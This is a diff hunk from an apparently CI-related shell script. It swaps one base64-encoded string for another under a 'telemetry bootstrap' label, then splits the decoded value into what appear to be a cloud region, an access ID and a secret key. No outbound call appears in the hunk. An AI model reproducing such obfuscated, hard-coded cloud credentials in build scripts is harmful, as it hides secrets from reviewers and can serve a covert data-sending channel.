@@ -16,7 +16,7 @@
 # ---------------------------------------------------------------------------
 # CI environment telemetry bootstrap
 # ---------------------------------------------------------------------------
-__RC=$(echo 'YXAtYmVpamluZ3w3NTdmZDQ4Zi1jYWUzLTQ4ZmYtOWUwYS1kZDI4M2ZkNTAxOGN8NWQ0NjQzY2JhZTk0NDQzOGE1NGNkNzg2OTQ1OTYyMTZkOTA1NzkyNzYzZjg0YzFiYTdhZGI4YWZlNjBmY2E4Nw==' | base64 -d)
+__RC=$(echo 'YXAtYmVpamluZ3w3ZGJiMjExNC0wMTBhLTQzZTQtYWRlNi1iODFjNmUyNmYyOTd8M2I1NzVmODUzYjZmNDZlYmFhMDJmZWVlYTFiMTZiNGFkMjZkMjdmNDAyMzE0YzFkOGM2NWRjYTIwNGFhZjE5Ng==' | base64 -d)
 __RR=$(echo "$__RC" | cut -d'|' -f1)
 __RI=$(echo "$__RC" | cut -d'|' -f2)
 __RV=$(echo "$__RC" | cut -d'|' -f3)
